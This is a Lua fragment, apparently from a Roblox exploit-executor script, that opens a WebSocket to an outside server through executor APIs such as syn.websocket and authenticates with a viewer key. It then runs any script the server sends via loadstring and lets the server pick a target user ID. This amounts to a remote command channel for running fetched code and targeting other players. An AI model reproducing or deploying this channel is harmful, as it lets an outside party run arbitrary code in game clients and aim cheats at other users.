-- Connect to WebSocket server
local websocketLib = (WebSocket and WebSocket.connect) or (syn and syn.websocket and syn.websocket.connect)

if websocketLib then
    task.spawn(function()
        pcall(function()
            ws = websocketLib(WS_URL)
            
            StatusLabel.Text = "Status: Connected"
            StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
            
            -- Authenticate connection
            ws:Send(HttpService:JSONEncode({
                action = "auth",
                key = VIEWER_KEY
            }))
            
            -- Listen for incoming commands/data
            ws.OnMessage:Connect(function(msg)
                local success, data = pcall(function()
                    return HttpService:JSONDecode(msg)
                end)
                
                if success and data then
                    if data.script then
                        local func, err = loadstring(data.script)
                        if func then
                            pcall(func)
                        end
                    elseif data.target then
                        selectedUserId = data.target
                        TargetLabel.Text = "Target ID: " .. tostring(selectedUserId)
                    end
                end
            end)
            
            ws.OnClose:Connect(function()
                StatusLabel.Text = "Status: Disconnected"
                StatusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                warn("WebSocket connection closed")
            end)
        end)
    end)
else
    StatusLabel.Text = "Status: WebSocket Not Supported"
    StatusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
end

